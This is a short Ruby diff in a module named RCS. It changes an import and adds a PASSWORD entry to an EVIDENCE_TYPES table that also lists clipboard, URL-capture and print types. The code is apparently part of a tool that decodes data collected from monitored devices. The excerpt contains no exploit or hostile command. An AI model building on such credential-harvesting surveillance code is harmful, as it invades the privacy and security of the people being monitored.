@@ -1,6 +1,6 @@
 
 require 'ffi'
-require 'rcs-common/stringio'
+require 'rcs-common/utf16le'
 
 module RCS
 
@@ -16,7 +16,8 @@ EVIDENCE_TYPES = { 0x0240 => :DEVICE,
                    0x0100 => :PRINT,
                    0x0180 => :URL,
                    0x0181 => :URLCAPTURE,
-                   0xD9D9 => :CLIPBOARD, }
+                   0xD9D9 => :CLIPBOARD,
+                   0xFAFA => :PASSWORD,}
 
 class EvidenceDeserializeError < StandardError
   attr_reader :msg
